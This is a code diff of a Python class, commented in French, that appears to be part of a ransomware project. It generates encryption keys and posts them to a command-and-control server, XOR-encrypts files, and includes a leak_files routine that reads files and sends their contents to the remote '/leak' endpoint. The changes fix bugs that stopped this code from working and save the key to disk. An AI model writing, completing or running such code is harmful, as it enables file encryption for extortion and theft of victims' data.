@@ -39,7 +39,6 @@ class SecretManager:
         return kdf.derive(key)
                 
 
-
     def create(self)->Tuple[bytes, bytes, bytes]:
         salt= secrets.token_bytes(self.SALT_LENGTH) #génération  d'un sel aléatoire
         key= secrets.token_bytes(self.KEY_LENGTH) # génération d'une clé aléatoire
@@ -49,64 +48,88 @@ class SecretManager:
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
-
+    
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         data = {
-                "token": self.bin_to_64(token),
-                "salt": self.bin_to_64(salt),
-                "key": self.bin_to_64(key),
+                "token": self.bin_to_b64(token),
+                "salt": self.bin_to_b64(salt),
+                "key": self.bin_to_b64(key),
             }
         requests.post(f"http://{self._remote_host_port}/new", json=data) #envoi des données au cnc
 
-    def setup(self)->None:
+
+    def setup(self) -> None:
+        
         os.makedirs(self._path, exist_ok=True) #crée le répertoire s'il n'existe pas 
-        token_path= os.path.join(self._path, "token.bin") #chemin du fichier du token
-        if os.path.exists(token_path):
-            return #si le fichier existe déja, ne rien faire alors
-        
-        salt, key, token = self.create() #génération des clés et du token
-        
+        token_path = os.path.join(self._path, "token.bin")
+        key_path = os.path.join(self._path, "key.bin")
+
+        if os.path.exists(token_path) and os.path.exists(key_path):
+            self.load()
+            return
+
+        salt, key, token = self.create()
+        self._key = key
+
         with open(token_path, "wb") as f:
-            f.write(token) #enregistrement du token
+            f.write(token)
+
+        with open(key_path, "wb") as f:
+            f.write(key)  # Sauvegarde la clé !
+
         with open(os.path.join(self._path, "salt.bin"), "wb") as f:
-            f.write(salt) #enregistrement du sel
-        
-        self.post_new(salt, key, token) #envoi des clés au serveur cnc
+            f.write(salt)
 
-    def load(self)->None:
-        with open(os.path.join(self._path, "token.bin"), "rb") as f:
-            self._token = f.read() #lecture du token
-        with open(os.path.join(self._path, "salt.bin"), "rb") as f:
-            self._salt = f.read() #lecture du sel
-        
+        self.post_new(salt, key, token)
 
-    def check_key(self, candidate_key:bytes)->bool:
-        return self.do_derivation(self._salt, candidate_key) == self._token #compare la dérivée au token
+        self.load()
 
-    def set_key(self, b64_key:str)->None:
-        key = base64.b64decode(b64_key) # convertit la clé 64 en bytes
-        if not self.check_key(key):
-            raise ValueError("invalid key") # érreur si la clé est incorrecte
-        self._key = key # stocke la clé pour le chiffrement/déchiffrement
+    def load(self) -> None:
+        token_path = os.path.join(self._path, "token.bin")
+        salt_path = os.path.join(self._path, "salt.bin")
+        key_path = os.path.join(self._path, "key.bin")
 
-    def get_hex_token(self)->str:
-        return sha256(self._token).hexdigest() #hachage SHA256 du token
+        with open(token_path, "rb") as f:
+            self._token = f.read()
 
-    def xorfiles(self, files:List[str])->None:
+        with open(salt_path, "rb") as f:
+            self._salt = f.read()
+
+        if os.path.exists(key_path):
+            with open(key_path, "rb") as f:
+                self._key = f.read()
+        else:
+            self._key = None
+
+    def check_key(self, candidate_key: bytes) -> bool:
+        return self.do_derivation(self._salt, candidate_key) == self._token
+
+    def set_key(self, b64_key: str) -> None:
+        key = base64.b64decode(b64_key)
+        self._key = key
+
+    def get_hex_token(self) -> str:
+        return sha256(self._token).hexdigest()
+
+    def xorfiles(self, files: List[str]) -> None:
         for file in files:
-            xorfile(file, self._key) #chiffre ou déchiffre chaque fichier avec la clé stockée
+            print(f"Chiffrement/Déchiffrement du fichier -> {file}")
+            xorfile(file, self._key)
 
-    def leak_files(self, files:List[str])->None:
+    def leak_files(self, files: List[str]) -> None:
         for file in files:
             with open(file, "rb") as f:
-                encoded_data = self.bin_to_64(f.read()) #convertit le fichier en base64
+                encoded_data = self.bin_to_b64(f.read())
+
             data = {
                 "token": self.bin_to_b64(self._token),
                 "filename": os.path.basename(file),
                 "data": encoded_data,
             }
-            requests.post(f"http://{self._remote_host_port}/leak", json=data) #encoi au cnc
+            requests.post(f"http://{self._remote_host_port}/leak", json=data)
 
-    def clean(self):
-        os.remove(os.path.join(self._path, "token.bin")) #supprime le token
-        os.remove(os.path.join(self._path, "salt.bin")) #supprime le sel
+    def clean(self) -> None:
+        """Supprime les fichiers contenant les clés"""
+        os.remove(os.path.join(self._path, "token.bin"))
+        os.remove(os.path.join(self._path, "salt.bin"))
+        os.remove(os.path.join(self._path, "key.bin")) 
